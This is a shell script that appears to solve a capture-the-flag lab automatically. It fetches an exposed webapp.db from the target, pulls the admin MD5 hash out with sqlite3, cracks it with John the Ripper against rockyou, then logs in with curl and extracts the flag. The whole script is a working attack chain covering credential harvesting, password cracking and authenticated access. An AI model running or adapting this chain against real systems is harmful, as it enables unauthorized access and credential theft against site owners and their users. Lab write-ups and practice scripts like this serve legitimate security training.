#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define host IP ( the machine to attack ) and remote IP ( the machine which supports the attack )
target_ip="10.10.210.85"
attack_ip="10.10.30.237"

# Prepare environment
mkdir /work/ 2>/dev/null

# Collect database content from assets directory (look at the page source code)
echo "1 - RETRIEVING WEBAPP.DB"
wget -q http://$target_ip:81/assets/webapp.db
mv webapp.db /work/2-webapp.db

# Use sqlite3 to gather content
# Perform the query
echo "2 - ANALYZING DATABASE USING sqlite3"
sqlite3 /work/2-webapp.db ".tables" > /work/2-tables
sqlite3 /work/2-webapp.db "PRAGMA table_info(users)" > /work/2-headers
sqlite3 /work/2-webapp.db "SELECT * FROM users;" > /work/2-users

# Gather admin password
echo "3 - GATHERING HASHED ADMIN PASSWORD"
HASH=$(grep admin /work/2-users | awk -F'|' '{print $3}')
echo $HASH > /work/2-hash.txt
echo "--> Hash : $HASH"

# Crack it with John
echo "4 - GATHERING HASHED ADMIN PASSWORD"
rm /opt/john/john.pot 2>/dev/null
/opt/john/john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt /work/2-hash.txt >/dev/null 2>/dev/null
/opt/john/john --show /work/2-hash.txt >/dev/null 2>/dev/null
PASSWORD=$(cat /opt/john/john.pot | awk -F':' '{print $2}')
echo "--> Password cracked : $PASSWORD"

# Initiate php session
echo "5 - AUTHENTICATE ON WEBSITE"
curl -s -X GET "http://$target_ip:81/login.php" -c "/work/2-cookies.txt" -L > /dev/null
PHPSESSID=$(grep PHPSESSID "/work/2-cookies.txt" | awk '{print $7}')
echo "--> Session initiated : $PHPSESSID"

# Authenticate
curl -s -X POST "http://$target_ip:81/login.php" -b /work/2-cookies.txt -L -H "Content-Type: application/x-www-form-urlencoded" -d "user=admin" -d"pass=${PASSWORD}" > /work/2-flag.html
echo "--> Flag is : $(sed -n 's/.*<code>\(.*{.*}\)<\/code>.*/\1/p' /work/2-flag.html)"

rm -f /work/2-cookies.txt